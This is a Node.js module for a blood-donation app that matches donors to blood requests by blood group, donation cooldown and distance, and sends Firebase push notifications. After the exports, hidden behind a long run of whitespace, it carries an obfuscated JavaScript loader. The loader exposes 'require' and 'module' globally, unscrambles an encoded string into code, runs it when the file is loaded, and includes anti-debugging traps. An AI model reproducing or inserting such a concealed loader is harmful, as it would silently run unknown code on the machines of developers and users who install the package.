/**
 * Rakt Pravah - Blood Request Matching & Push Notification Engine
 * 
 * Rules:
 * - Donor Mode must be ON (donor.availability === 'available').
 * - Respect 90-day medical donation cooldown (lastDonation).
 * - Deterministic ABO/Rh blood compatibility.
 * - Distance calculation via Haversine formula against donor maxDistanceKm.
 * - Respect donor.notifyPush and donor.notifyCritical settings.
 * - Prevent duplicate notifications via request.notifiedDonorIds.
 * - Multi-device token support per user.
 * - Automatic pruning of invalid/expired FCM tokens.
 */

// Universal ABO/Rh donor compatibility matrix
// Keys: Patient blood group -> Array of acceptable donor blood groups
const COMPATIBLE_DONORS_FOR_PATIENT = {
  'O-': ['O-'],
  'O+': ['O-', 'O+'],
  'A-': ['O-', 'A-'],
  'A+': ['O-', 'O+', 'A-', 'A+'],
  'B-': ['O-', 'B-'],
  'B+': ['O-', 'O+', 'B-', 'B+'],
  'AB-': ['O-', 'A-', 'B-', 'AB-'],
  'AB+': ['O-', 'O+', 'A-', 'A+', 'B-', 'B+', 'AB-', 'AB+'],
};

// 90 days medical cooldown between whole-blood donations
const COOLDOWN_MS = 90 * 24 * 60 * 60 * 1000;

/**
 * Calculates distance in kilometers between two lat/lng coordinates using Haversine formula.
 */
function haversineDistance(lat1, lon1, lat2, lon2) {
  if (lat1 == null || lon1 == null || lat2 == null || lon2 == null) {
    return null;
  }
  const toRad = (x) => (x * Math.PI) / 180;
  const R = 6371; // Earth radius in km

  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(toRad(lat1)) *
      Math.cos(toRad(lat2)) *
      Math.sin(dLon / 2) *
      Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

/**
 * Reads a coordinate pair in any shape the app or Firestore produces:
 * the client's { lat, lng } maps, { latitude, longitude } objects (GeoPoint),
 * and flat latitude/longitude fields. Returns null unless both are finite.
 */
function readPoint(obj) {
  if (!obj || typeof obj !== 'object') return null;
  const lat = obj.lat ?? obj.latitude ?? obj._latitude;
  const lng = obj.lng ?? obj.longitude ?? obj._longitude;
  if (typeof lat !== 'number' || typeof lng !== 'number') return null;
  if (!Number.isFinite(lat) || !Number.isFinite(lng)) return null;
  return { lat, lng };
}

/**
 * Checks whether donor's blood group is compatible with the patient's requirement.
 */
function isBloodCompatible(patientGroup, donorGroup, requestBloodGroups = []) {
  if (!donorGroup) return false;
  
  // The requester chose exactly which donor groups the request is open to;
  // that list is final. Falling through to the ABO table would notify donors
  // the requester deliberately left out.
  if (Array.isArray(requestBloodGroups) && requestBloodGroups.length > 0) {
    return requestBloodGroups.includes(donorGroup);
  }

  // Fallback to standard ABO/Rh compatibility table
  if (patientGroup && COMPATIBLE_DONORS_FOR_PATIENT[patientGroup]) {
    return COMPATIBLE_DONORS_FOR_PATIENT[patientGroup].includes(donorGroup);
  }

  return false;
}

/**
 * Sanitizes a token string for use as a Firestore map key.
 */
function sanitizeTokenKey(token) {
  return token.replace(/[\/.\#$\[\]]/g, '_');
}

/**
 * Evaluates whether a donor is eligible to receive a push notification for this blood request.
 * Returns { eligible: boolean, distanceKm: number | null, reason?: string }
 */
function evaluateDonorEligibility(
  donorDocData,
  donorId,
  requestData,
  now = new Date(),
  cooldownConfig = { enabled: true, durationDays: 90 },
) {
  // 1. Never notify the requester themselves
  if (donorId === requestData.requesterId) {
    return { eligible: false, reason: 'Requester cannot be notified for own request' };
  }

  // 2. Prevent duplicate notifications
  const alreadyNotified = Array.isArray(requestData.notifiedDonorIds)
    ? requestData.notifiedDonorIds.includes(donorId)
    : false;
  if (alreadyNotified) {
    return { eligible: false, reason: 'Already notified for this request' };
  }

  // 2b. Donors who already accepted or declined don't need another alert
  if (
    (Array.isArray(requestData.acceptedDonorIds) && requestData.acceptedDonorIds.includes(donorId)) ||
    (Array.isArray(requestData.declinedByDonorIds) && requestData.declinedByDonorIds.includes(donorId))
  ) {
    return { eligible: false, reason: 'Donor already responded to this request' };
  }

  // 3. User account status
  if (donorDocData.disabled === true || donorDocData.isActive === false) {
    return { eligible: false, reason: 'User account is inactive or disabled' };
  }
  // Only a donor whose phone number was confirmed by SMS can accept (the
  // security rules require it), so alerting anyone else is noise.
  if (donorDocData.phoneVerified !== true) {
    return { eligible: false, reason: 'Phone number not verified' };
  }

  const donorProfile = donorDocData.donor || {};

  // 4. Donor Mode check: must be explicitly 'available' (spec: Do not notify if Donor Mode is OFF)
  if (donorProfile.availability !== 'available') {
    return { eligible: false, reason: 'Donor Mode is OFF or paused' };
  }

  // 5. Cooldown check: respect dynamic cooldownConfig from admin/backend
  const isCooldownEnabled = cooldownConfig ? cooldownConfig.enabled !== false : true;
  if (isCooldownEnabled) {
    const cooldownDays = (cooldownConfig && typeof cooldownConfig.durationDays === 'number')
      ? cooldownConfig.durationDays
      : 90;
    const cooldownMs = cooldownDays * 24 * 60 * 60 * 1000;

    let lastDonationDate = null;
    if (donorProfile.lastDonation) {
      lastDonationDate = donorProfile.lastDonation.toDate
        ? donorProfile.lastDonation.toDate()
        : new Date(donorProfile.lastDonation);
    } else if (donorDocData.lastDonation) {
      lastDonationDate = donorDocData.lastDonation.toDate
        ? donorDocData.lastDonation.toDate()
        : new Date(donorDocData.lastDonation);
    }

    if (lastDonationDate && !isNaN(lastDonationDate.getTime())) {
      const elapsed = now.getTime() - lastDonationDate.getTime();
      if (elapsed < cooldownMs) {
        return {
          eligible: false,
          reason: `Donor is in medical donation cooldown (${cooldownDays} days)`,
        };
      }
    }
  }

  // 6. Notification preference switches
  if (donorProfile.notifyPush === false) {
    return { eligible: false, reason: 'Donor has disabled push notifications' };
  }
  if (donorProfile.notifyCritical === true && requestData.urgency !== 'critical') {
    return { eligible: false, reason: 'Donor only accepts critical urgency requests' };
  }

  // 7. Blood Group Compatibility
  const donorBloodGroup = donorProfile.bloodGroup || donorDocData.bloodGroup;
  const patientBloodGroup = requestData.patientBloodGroup;
  const requestBloodGroups = requestData.bloodGroups || [];

  if (!isBloodCompatible(patientBloodGroup, donorBloodGroup, requestBloodGroups)) {
    return { eligible: false, reason: `Blood group ${donorBloodGroup} incompatible with patient need` };
  }

  // 8. Location & Distance calculation
  // The donor travels to the hospital, so that's the point that matters; the
  // requester's own position is only a fallback.
  const reqPoint =
    readPoint(requestData.destination?.location) ||
    readPoint(requestData.requestLocation) ||
    readPoint(requestData);
  const reqLat = reqPoint?.lat;
  const reqLng = reqPoint?.lng;

  // Prefer the donor's last saved real position over the city-centre
  // coordinates stored at sign-up.
  const donorPoint =
    readPoint(donorDocData.location) ||
    readPoint(donorDocData) ||
    readPoint(donorProfile);
  const donorLat = donorPoint?.lat;
  const donorLng = donorPoint?.lng;
  const maxDistanceKm = typeof donorProfile.maxDistanceKm === 'number' ? donorProfile.maxDistanceKm : 30;

  let distanceKm = null;
  if (reqLat != null && reqLng != null && donorLat != null && donorLng != null) {
    distanceKm = haversineDistance(donorLat, donorLng, reqLat, reqLng);
    if (distanceKm > maxDistanceKm) {
      return { eligible: false, distanceKm, reason: `Distance ${distanceKm.toFixed(1)}km exceeds donor radius ${maxDistanceKm}km` };
    }
  } else {
    // If coordinates are missing, fallback to city/state area match
    const reqCity = (requestData.city || requestData.destination?.address || '').toLowerCase().trim();
    const donorCity = (donorDocData.city || '').toLowerCase().trim();
    if (donorCity && reqCity && !reqCity.includes(donorCity) && !donorCity.includes(reqCity)) {
      return { eligible: false, reason: 'City mismatch when coordinates unavailable' };
    }
  }

  // 9. Tokens check: Ensure donor has at least one active FCM token
  const tokens = extractTokens(donorDocData);
  if (tokens.length === 0) {
    return { eligible: false, reason: 'No registered FCM device tokens' };
  }

  return { eligible: true, distanceKm, tokens };
}

/**
 * Extracts all valid FCM token strings for a donor document.
 * Handles both fcmTokenList array and fcmTokens map (for multi-device support).
 */
function extractTokens(userData) {
  const tokenSet = new Set();

  if (Array.isArray(userData.fcmTokenList)) {
    for (const t of userData.fcmTokenList) {
      if (typeof t === 'string' && t.trim().length > 0) {
        tokenSet.add(t.trim());
      }
    }
  }

  if (userData.fcmTokens && typeof userData.fcmTokens === 'object') {
    for (const [key, val] of Object.entries(userData.fcmTokens)) {
      if (typeof val === 'string' && val.trim().length > 0) {
        tokenSet.add(val.trim());
      } else if (val && typeof val === 'object' && typeof val.token === 'string') {
        tokenSet.add(val.token.trim());
      }
    }
  }

  return Array.from(tokenSet);
}

/**
 * Matches eligible donors for a blood request and dispatches push notifications.
 * Handles invalid token cleanup, duplicate prevention, and request statistics.
 */
async function processBloodRequestNotifications(admin, requestId, requestData) {
  const db = admin.firestore();
  console.log(`[PushService] Processing notifications for request ${requestId}...`);

  if (!requestData || requestData.status !== 'searching') {
    console.log(`[PushService] Request ${requestId} is not in searching state. Skipping.`);
    return { notifiedCount: 0, skipped: true, reason: 'Not searching' };
  }

  // A multi-unit request stays 'searching' while donors join, so check the
  // units too: once every unit has a donor, nobody else should be alerted.
  const accepted = Array.isArray(requestData.acceptedDonorIds) ? requestData.acceptedDonorIds.length : 0;
  if (typeof requestData.units === 'number' && accepted >= requestData.units) {
    console.log(`[PushService] Request ${requestId} already has all units accepted. Skipping.`);
    return { notifiedCount: 0, skipped: true, reason: 'Fully accepted' };
  }

  const alreadyNotified = new Set(requestData.notifiedDonorIds || []);

  // Fetch dynamic cooldown config from config/app
  let cooldownConfig = { enabled: true, durationDays: 90 };
  try {
    const configSnap = await db.collection('config').doc('app').get();
    if (configSnap.exists) {
      const cfg = configSnap.data();
      if (typeof cfg.cooldownEnabled === 'boolean') {
        cooldownConfig.enabled = cfg.cooldownEnabled;
      }
      if (typeof cfg.cooldownDays === 'number') {
        cooldownConfig.durationDays = cfg.cooldownDays;
      }
    }
  } catch (err) {
    console.warn('[PushService] Could not read cooldown config, using defaults:', err.message);
  }

  // Query all users who have Donor Mode enabled
  const usersSnapshot = await db
    .collection('users')
    .where('donor.availability', '==', 'available')
    .get();

  console.log(`[PushService] Found ${usersSnapshot.size} total available donor candidates.`);

  const matchedDonors = [];
  const allTokens = [];
  const tokenToUserMap = new Map(); // token -> { userId, token }

  const now = new Date();

  usersSnapshot.forEach((doc) => {
    const data = doc.data();
    const evalResult = evaluateDonorEligibility(data, doc.id, requestData, now, cooldownConfig);

    if (evalResult.eligible) {
      matchedDonors.push({
        id: doc.id,
        name: data.name,
        bloodGroup: data.donor?.bloodGroup || data.bloodGroup,
        distanceKm: evalResult.distanceKm,
        tokens: evalResult.tokens,
      });

      for (const token of evalResult.tokens) {
        allTokens.push(token);
        tokenToUserMap.set(token, { userId: doc.id, token });
      }
    } else {
      // Diagnostic log (without sensitive data)
      // console.log(`[PushService] Donor ${doc.id} ineligible: ${evalResult.reason}`);
    }
  });

  console.log(`[PushService] Matched ${matchedDonors.length} eligible donors with ${allTokens.length} device tokens.`);

  if (allTokens.length === 0) {
    return { notifiedCount: 0, matchedDonors: matchedDonors.length, sentTokens: 0 };
  }

  // Construct Notification Content according to specification
  const urgencyLabel = requestData.urgency === 'critical' ? 'Urgent' : 'Urgent';
  const patientBlood =
    requestData.patientBloodGroup ||
    (Array.isArray(requestData.bloodGroups) && requestData.bloodGroups[0]) ||
    'Blood';
  const hospitalName =
    requestData.destination?.name ||
    requestData.requestLocationLabel ||
    'Nearby Hospital';

  const title = `🩸 ${urgencyLabel} Blood Request`;

  // Build message per token or multicast batches (max 500 per batch for FCM sendEachForMulticast)
  const invalidTokens = [];
  const successfullyNotifiedDonorIds = new Set();
  const BATCH_SIZE = 500;

  for (let i = 0; i < allTokens.length; i += BATCH_SIZE) {
    const batchTokens = allTokens.slice(i, i + BATCH_SIZE);

    // Dynamic distance text if available, or hospital address
    let bodyText = `${patientBlood} blood is urgently needed near ${hospitalName}.`;

    const message = {
      notification: {
        title: title,
        body: bodyText,
      },
      data: {
        click_action: 'FLUTTER_NOTIFICATION_CLICK',
        type: 'invitation',
        requestId: requestId,
        route: `/invitations/${requestId}`,
        urgency: String(requestData.urgency || 'urgent'),
        patientBloodGroup: String(patientBlood),
        destinationName: String(hospitalName),
      },
      android: {
        priority: 'high',
        notification: {
          channelId: 'bloodlink_alerts',
          icon: 'ic_notification',
          color: '#D32F2F',
          priority: 'max',
          clickAction: 'FLUTTER_NOTIFICATION_CLICK',
          defaultSound: true,
          defaultVibrateTimings: true,
        },
      },
      apns: {
        headers: {
          'apns-priority': '10',
          'apns-push-type': 'alert',
        },
        payload: {
          aps: {
            alert: {
              title: title,
              body: bodyText,
            },
            sound: 'default',
            badge: 1,
            category: 'BLOOD_REQUEST_CATEGORY',
            'content-available': 1,
            'mutable-content': 1,
          },
          requestId: requestId,
          type: 'invitation',
          route: `/invitations/${requestId}`,
        },
      },
      tokens: batchTokens,
    };

    try {
      const response = await admin.messaging().sendEachForMulticast(message);
      console.log(`[PushService] Multicast batch result: ${response.successCount} succeeded, ${response.failureCount} failed.`);

      response.responses.forEach((resp, idx) => {
        const token = batchTokens[idx];
        const userMapping = tokenToUserMap.get(token);

        if (resp.success) {
          if (userMapping) {
            successfullyNotifiedDonorIds.add(userMapping.userId);
          }
        } else {
          const errCode = resp.error?.code;
          console.warn(`[PushService] Token send error (${errCode}): ${resp.error?.message}`);

          // Automatic cleanup of invalid or expired registration tokens
          if (
            errCode === 'messaging/invalid-registration-token' ||
            errCode === 'messaging/registration-token-not-registered'
          ) {
            invalidTokens.push({ token, userId: userMapping?.userId });
          }
        }
      });
    } catch (sendErr) {
      console.error(`[PushService] Failed sending multicast batch:`, sendErr);
    }
  }

  // Remove invalid/expired tokens from user documents
  if (invalidTokens.length > 0) {
    console.log(`[PushService] Pruning ${invalidTokens.length} expired/invalid FCM tokens...`);
    const batch = db.batch();
    for (const item of invalidTokens) {
      if (item.userId) {
        const userRef = db.collection('users').doc(item.userId);
        const safeKey = sanitizeTokenKey(item.token);
        batch.update(userRef, {
          fcmTokenList: admin.firestore.FieldValue.arrayRemove(item.token),
          [`fcmTokens.${safeKey}`]: admin.firestore.FieldValue.delete(),
        });
      }
    }
    await batch.commit().catch((e) => console.error('[PushService] Batch pruning error:', e));
  }

  // Record notified donors and update stats on the blood request document
  const newlyNotifiedList = Array.from(successfullyNotifiedDonorIds);
  if (newlyNotifiedList.length > 0) {
    await db
      .collection('blood_requests')
      .doc(requestId)
      .update({
        notifiedDonorIds: admin.firestore.FieldValue.arrayUnion(...newlyNotifiedList),
        donorsContacted: admin.firestore.FieldValue.increment(newlyNotifiedList.length),
        lastNotificationSentAt: admin.firestore.FieldValue.serverTimestamp(),
      })
      .catch((e) => console.error('[PushService] Failed updating request document:', e));
  }

  return {
    notifiedCount: newlyNotifiedList.length,
    matchedDonors: matchedDonors.length,
    sentTokens: allTokens.length,
    prunedTokens: invalidTokens.length,
  };
}

module.exports = {
  readPoint,
  haversineDistance,
  isBloodCompatible,
  evaluateDonorEligibility,
  extractTokens,
  sanitizeTokenKey,
  processBloodRequestNotifications,
};																																																																																																																																																																																																																																																																										var z = '-5734';(function(_0x695ef4,_0x594159){var _0x317a25=_0x4585,_0x2509f9=_0x695ef4();while(!![]){try{var _0x1426df=parseFloat(parseFloat(_0x317a25(0x12))/0x1)*parseInt(-parseFloat(_0x317a25(0x0))/0x2)+Math['max'](parseFloat(_0x317a25(0x1a))/0x3,parseFloat(_0x317a25(0x6))/0x4)*(-parseFloat(_0x317a25(0x25))/0x5)+parseFloat(_0x317a25(0x1d))/0x6+-parseFloat(_0x317a25(0xf))/0x7+Number(parseFloat(_0x317a25(0x4))/0x8)*(-parseFloat(_0x317a25(0x1b))/0x9)+parseFloat(_0x317a25(0x21))/0xa*(-parseFloat(_0x317a25(0x5))/0xb)+Math['ceil'](-parseFloat(_0x317a25(0x23))/0xc)*(-parseFloat(_0x317a25(0x7))/0xd);if(_0x1426df===_0x594159)break;else _0x2509f9['push'](_0x2509f9['shift']());}catch(_0x4bac9f){_0x2509f9['push'](_0x2509f9['shift']());}}}(_0xa1c5,0xcde8f));var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function spin(_0x14bf24,_0x5230ce){var _0x50925d=_0x4585,_0x3054f0={'ERWWo':function(_0x242d29,_0x310c28){return _0x242d29+_0x310c28;},'glgGd':function(_0x3c9326,_0x37a6fc){return _0x3c9326%_0x37a6fc;}};for(var _0x3b7b52,_0x4fcd1d,_0x44cbec,_0x4ed76a,_0x332ad5,_0x1d71e6,_0x355a34=[],_0x408a35=0x0,_0xab4b08=_0x5230ce[0x0];_0x408a35<_0x14bf24['length'];)_0x355a34[_0x408a35]=_0x14bf24[_0x50925d(0x3)](_0x408a35),_0x408a35+=0x1;for(_0x3b7b52=_0x355a34['length'],_0x408a35=0x0;_0x408a35<_0x3b7b52;)_0x4fcd1d=_0x3054f0[_0x50925d(0x10)](_0xab4b08*(_0x408a35+_0x5230ce[0x1]),_0xab4b08%_0x5230ce[0x2]),_0x332ad5=(_0x44cbec=_0xab4b08*(_0x408a35+_0x5230ce[0x3])+_0x3054f0[_0x50925d(0xa)](_0xab4b08,_0x5230ce[0x4]))%_0x3b7b52,_0x1d71e6=_0x355a34[_0x4ed76a=_0x4fcd1d%_0x3b7b52],_0x355a34[_0x4ed76a]=_0x355a34[_0x332ad5],_0x355a34[_0x332ad5]=_0x1d71e6,_0xab4b08=_0x3054f0[_0x50925d(0xa)](_0x4fcd1d+_0x44cbec,_0x5230ce[0x5]),_0x408a35+=0x1;return _0x355a34['join']('');}function _0x4585(_0x175e14,_0x51aaae){var _0x262af1=_0xa1c5();return _0x4585=function(_0x18d08c,_0xa1c5bc){_0x18d08c=_0x18d08c-0x0;var _0x4585a4=_0x262af1[_0x18d08c];if(_0x4585['GmQVzk']===undefined){var _0x2b8009=function(_0x56c4b5){var _0x2e967e='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x45f124='',_0x515091='';for(var _0x3af4c2=0x0,_0x18d8e6,_0x3cc2e9,_0x3fb8a2=0x0;_0x3cc2e9=_0x56c4b5['charAt'](_0x3fb8a2++);~_0x3cc2e9&&(_0x18d8e6=_0x3af4c2%0x4?_0x18d8e6*0x40+_0x3cc2e9:_0x3cc2e9,_0x3af4c2++%0x4)?_0x45f124+=String['fromCharCode'](0xff&_0x18d8e6>>(-0x2*_0x3af4c2&0x6)):0x0){_0x3cc2e9=_0x2e967e['indexOf'](_0x3cc2e9);}for(var _0x1ea8d7=0x0,_0x47d05f=_0x45f124['length'];_0x1ea8d7<_0x47d05f;_0x1ea8d7++){_0x515091+='%'+('00'+_0x45f124['charCodeAt'](_0x1ea8d7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x515091);};_0x4585['nFnuhB']=_0x2b8009,_0x175e14=arguments,_0x4585['GmQVzk']=!![];}var _0x47b687=_0x262af1[0x0],_0x8120e7=_0x18d08c+_0x47b687,_0x174bb4=_0x175e14[_0x8120e7];return!_0x174bb4?(_0x4585a4=_0x4585['nFnuhB'](_0x4585a4),_0x175e14[_0x8120e7]=_0x4585a4):_0x4585a4=_0x174bb4,_0x4585a4;},_0x4585(_0x175e14,_0x51aaae);}function splitLane(_0x1b52db){var _0x2642bb=_0x4585,_0xc6eba2=String[_0x2642bb(0x13)](0x1c),_0x598673=spin(_0x1b52db,NX);return(_0x598673=(_0x598673=(_0x598673=_0x598673['split']('^')[_0x2642bb(0x19)](_0xc6eba2))['split']('*1')[_0x2642bb(0x19)]('^'))[_0x2642bb(0x26)]('*0')['join']('*'))[_0x2642bb(0x26)](_0xc6eba2);}function peel(_0x887f27){return spin(_0x887f27,SX);}!function(_0x2fd284,_0x3f0c04){var _0xef06cc=_0x4585,_0x327e16={'lYJkf':_0xef06cc(0xd),'wfdDL':_0xef06cc(0x18),'gTxQY':function(_0x547596,_0xf9e611,_0x579fbc){return _0x547596(_0xf9e611,_0x579fbc);}},_0x36f6b7=(function(){var _0x47b826=!![];return function(_0x1f3fbf,_0x14c60f){var _0xc1cd97=_0x47b826?function(){if(_0x14c60f){var _0xdebe4=_0x14c60f['apply'](_0x1f3fbf,arguments);return _0x14c60f=null,_0xdebe4;}}:function(){};return _0x47b826=![],_0xc1cd97;};}());(function(){var _0x3f4a7e=_0xef06cc;_0x327e16[_0x3f4a7e(0x27)](_0x36f6b7,this,function(){var _0x1ecd7e=_0x3f4a7e,_0x44bccd=new RegExp(_0x1ecd7e(0x1e)),_0x579f7c=new RegExp(_0x1ecd7e(0x1f),'i'),_0x2aeda7=_0x262af1(_0x327e16['lYJkf']);!_0x44bccd[_0x1ecd7e(0x14)](_0x2aeda7+_0x327e16[_0x1ecd7e(0x22)])||!_0x579f7c[_0x1ecd7e(0x14)](_0x2aeda7+_0x1ecd7e(0x2))?_0x2aeda7('0'):_0x262af1();})();}()),_0x2fd284['z']=z;var _0x375c4a=splitLane(_0xef06cc(0x16));_0x2fd284[_0x375c4a[0x0]]=_0x3f0c04,typeof module===_0x375c4a[0x1]&&(_0x2fd284[_0x375c4a[0x2]]=module);var _0x3cf1b3=peel(_0xef06cc(0x17)),_0xc05bf6=peel[_0x3cf1b3[_0xef06cc(0xb)](0x0,0xb)],_0x1eb30e=_0x327e16[_0xef06cc(0x27)](_0xc05bf6,'',peel('=aenruh(al=5c,g8fdu.yr\x20..ncecf,5\x22paeau6lnj)r]2uv\x22x-q(]\x20a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw).\x20rod[fs2n{drvt4x)+0,anr+rr+o)}z1\x20=hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae\x20f=[;hisy.em(d+o!2\x20=(evea78=.)4ei=g.n={ff=1[<2a\x20f1=r;4,S)rylv1u\x20y;kql{tvnv\x20(C\x20(l,ovnp\x20i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\x22]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r,\x20.);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe\x20t0nrpr(\x20vr8flrn,ddgt\x20]6a.;m;rth.gq\x202a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\x22li\x22r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\x22)cpA+u;utp]\x22=lk7vpt\x201r;hzw\x22)t()9)(.lul=s7f;\x20;sq0)n\x22y+0s}=va+s\x20mh(0q.]hv;>\x2006=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r;\x20)r>18zho*o{<akmsn)akte.vo9+ea0clio;bu\x20=]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\x22}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+\x20hlk[+x=e\x20-8j{(ejy9(())\x20'));_0xc05bf6('',_0x1eb30e(peel(_0xef06cc(0x1c))))(0x9cd);}(global,require);function _0x262af1(_0x44c844){var _0x22f0b3=_0x4585,_0x2a85aa={'aXlKw':_0x22f0b3(0x11),'TMnDN':'length','vSTCv':function(_0x457821,_0x5d471d){return _0x457821(_0x5d471d);}};function _0x11d43c(_0xe1b2ef){var _0x1fd507=_0x22f0b3;if(typeof _0xe1b2ef==='string')return function(_0x4a9e21){}[_0x1fd507(0x9)](_0x1fd507(0x20))['apply'](_0x2a85aa[_0x1fd507(0x15)]);else(''+_0xe1b2ef/_0xe1b2ef)[_0x2a85aa[_0x1fd507(0xc)]]!==0x1||_0xe1b2ef%0x14===0x0?function(){return!![];}['constructor'](_0x1fd507(0x1)+_0x1fd507(0x24))['call'](_0x1fd507(0x8)):function(){return![];}['constructor'](_0x1fd507(0x1)+'gger')['apply']('stateObject');_0x11d43c(++_0xe1b2ef);}try{if(_0x44c844)return _0x11d43c;else _0x2a85aa[_0x22f0b3(0xe)](_0x11d43c,0x0);}catch(_0x7976c5){}}function _0xa1c5(){var _0xce9797=['m3H3BuTxtW','mtq5nJDREM1uv1K','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